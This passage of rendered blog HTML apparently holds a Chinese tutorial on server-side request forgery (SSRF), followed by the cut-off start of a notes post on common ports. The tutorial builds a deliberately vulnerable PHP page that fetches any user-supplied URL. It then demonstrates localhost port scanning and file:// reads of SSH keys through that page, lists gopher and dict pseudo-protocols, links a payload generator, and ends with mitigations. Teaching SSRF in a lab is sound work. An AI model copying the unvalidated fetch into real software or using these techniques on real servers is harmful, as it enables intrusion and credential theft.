+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/SSRF服务端请求伪造/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/23/SSRF服务端请求伪造/" itemprop="url">
+                  SSRF服务端请求伪造
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T23:06:44+08:00">
+                2018-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/23/SSRF服务端请求伪造/" class="leancloud_visitors" data-flag-title="SSRF服务端请求伪造">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-SSRF服务端请求伪造"><a href="#0x00-SSRF服务端请求伪造" class="headerlink" title="0x00 SSRF服务端请求伪造"></a>0x00 SSRF服务端请求伪造</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。与CSRF跨站请求伪造不同,它是利用服务端向其他内外网服务器发送请求。</p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在服务端请求伪造的缺陷。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
+<h2 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h2><ul>
+<li><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+</li>
+<li><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+</li>
+<li><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+</li>
+<li><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+</li>
+<li><p>5.利用file协议读取本地文件等。</p>
+</li>
+</ul>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>首先我们创建一个test.html,输入如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name=&quot;ssrf&quot; method=&quot;post&quot; action=&quot;http://127.0.0.1/ssrf/test.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;url&quot; value=&quot;&quot; style=&quot;width:500px&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;commit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>ps:这里我修改css是为了截图时候能截取的全面点，可以不加。</p>
+<p>然后写他对应的后台文件test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[&apos;url&apos;];</span><br><span class="line">$filename = &apos;./curled/&apos;.rand().&apos;txt&apos;;</span><br><span class="line">$curlobj = curl_init($link);</span><br><span class="line">$fp = fopen($filename,&quot;w&quot;);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line">fclose($fp);</span><br><span class="line">$fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp);</span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>其中：</p>
+<ul>
+<li>curl_init — 初始化一个cURL会话</li>
+<li>curl_setopt — 设置一个cURL传输选项。</li>
+<li>CURLOPT_FILE — 设置输出文件的位置，值是一个资源类型，默认为STDOUT (浏览器)。</li>
+<li>CURLOPT_HEADER — 启用时会将头文件的信息作为数据流输出。</li>
+<li>curl_exec — 执行一个cURL会话（在初始和设置选项完成后使用）</li>
+</ul>
+<p>然后我们通过输入框输入想要访问的url，就会加载对应的url过来，比如我们输入百度主页：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf01.png" alt=""></p>
+<p>就会返回：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf02.png" alt=""></p>
+<p>至此我们环境搭建完成。</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们上面提到了五种利用方式，我们拿其中的几种做一次实验。</p>
+<p>首先是端口扫描，如果我们要对内网端口进行扫描，就可以在这里输入127.0.0.1和对应端口进行尝试。</p>
+<p>如我们想查看mysql的banner信息，我们就可以输入127.0.0.1:3306</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf03.png" alt=""></p>
+<p>就可以看到一部分信息。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf04.png" alt=""></p>
+<p>然后是访问web应用默认文件，比如我们尝试wamp默认界面。直接输入127.0.0.1，访问wamp的默认信息，可以搜集到很多有用的信息。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf05.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf06.png" alt=""></p>
+<p>最后再来尝试一下利用file协议访问本地文件，file协议具体用法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file///c:/abc/filename.txt</span><br></pre></td></tr></table></figure></p>
+<p>file后面与http不同，有三个斜杠，然后跟本地路径和文件，这里可以是任何格式的文件，虽然在网页上显示的时候会有部分无法显示。</p>
+<p>我们尝试一个txt文件，发现可以读取。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf07.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf08.png" alt=""></p>
+<p>再尝试一个存放ssh密钥的敏感目录，发现，配置文件和密钥内容其实都可以访问。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf09.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf10.png" alt=""></p>
+<h2 id="0x05-应对"><a href="#0x05-应对" class="headerlink" title="0x05 应对"></a>0x05 应对</h2><ul>
+<li><p>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件,那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+</li>
+<li><p>2.统一设置错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+</li>
+<li><p>3.限制请求的端口仅为http常用的端口，比如，80,443,8080,8090。</p>
+</li>
+<li><p>4.将内网ip加入黑名单。</p>
+</li>
+<li><p>5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等。</p>
+</li>
+</ul>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>SSRF漏洞不如sql注入，xss，文件上传等漏洞有名，所以在很多地方疏于防范，其造成的危害不可小觑。</p>
+<h2 id="0x07-补充"><a href="#0x07-补充" class="headerlink" title="0x07 补充"></a>0x07 补充</h2><p>php ssrf中的伪协议：</p>
+<p>file;dict;sftp;ldap;tftp;gopher;http</p>
+<p>Java ssrf 中的伪协议：</p>
+<p>file;ftp;mailto;http;https;jar;netdoc;gopher</p>
+<p>ssrf攻击负载生成工具：</p>
+<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/常用端口笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/23/常用端口笔记/" itemprop="url">
+                  常用端口笔记
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T21:05:43+08:00">
+                2018-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/23/常用端口笔记/" class="leancloud_visitors" data-flag-title="常用端口笔记">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟知常用端口作用和容易引发的问题是网络安全中重要的一部分，这里记录一下常见端口的作用，用作笔记。</p>
+<h2 id="0x01-各端口作用"><a href="#0x01-各端口作用" class="headerlink" title="0x01 各端口作用"></a>0x01 各端口作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span 